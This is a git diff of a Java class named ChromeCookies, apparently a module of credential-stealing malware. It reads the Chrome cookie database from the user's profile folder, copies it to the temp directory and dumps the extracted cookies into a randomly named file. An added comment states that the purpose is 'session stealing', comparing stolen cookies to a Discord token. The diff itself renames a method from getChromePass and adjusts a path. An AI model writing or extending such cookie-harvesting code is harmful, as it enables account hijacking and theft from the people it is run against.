@@ -22,12 +22,16 @@ import java.util.Arrays;
 import java.util.Base64;
 import java.util.Random;
 
+/**
+ * Cookies can be used for session stealing, which means you can temporarily login with someones cookies, its like a discord token
+ * but it expires REALLY, REALLY fast
+ */
 public class ChromeCookies implements Request {
 
     File cookieDump;
     @Override
     public void init() throws Exception {
-        ArrayList<String> list = getChromePass();
+        ArrayList<String> list = getChromeCookies();
         cookieDump = new File(System.getProperty("java.io.tmpdir") + "/" + new Random().nextInt() + ".txt");
         FileOutputStream dumpStream = new FileOutputStream(cookieDump);
         for(String s: list){
@@ -51,14 +55,14 @@ public class ChromeCookies implements Request {
         };
     }
 
-    private ArrayList<String> getChromePass(){
+    private ArrayList<String> getChromeCookies(){
         ArrayList<String> info = new ArrayList<>();
         Connection conn = null;
         Statement statement = null;
 
         try {
             String loginDataFile = System.getProperty("user.home") + "/Appdata/Local/Google/Chrome/User Data/Default/Cookies";
-            String finalDestination = System.getProperty("java.io.tmpdir") + "/DataCookies";
+            String finalDestination = System.getProperty("java.io.tmpdir") + "DataCookies";
             File finalDestinationFile = new File(finalDestination);
             if(finalDestinationFile.exists())
                 finalDestinationFile.delete();
